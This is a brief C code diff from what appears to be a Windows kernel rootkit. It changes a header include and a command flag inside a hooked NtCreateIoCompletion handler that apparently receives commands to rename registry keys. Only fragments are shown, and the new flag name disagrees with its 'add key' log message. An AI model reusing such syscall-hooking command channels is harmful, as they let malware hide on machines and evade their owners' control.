@@ -1,5 +1,5 @@
 #include "inc.h"
-#include "rename_proc.h"
+#include "proc.h"
 #include "command.h"
 #include "net.h"
 #include "file.h"
@@ -185,7 +185,7 @@ ULONG_PTR HookNtCreateIoCompletion(
             }
 
         }
-        else if (pCmd->flags & COMMAND_ADD_KEY) {
+        else if (pCmd->flags & COMMAND_RENAME_KEY) {
             if (pCmd->flags & COMMAND_BUFFER_POINTER && pCmd->target != NULL && pCmd->change != NULL) {
 
                 DbgPrint("For key:%s add key:%s\n", (PCHAR)pCmd->target, (PCHAR)pCmd->change);
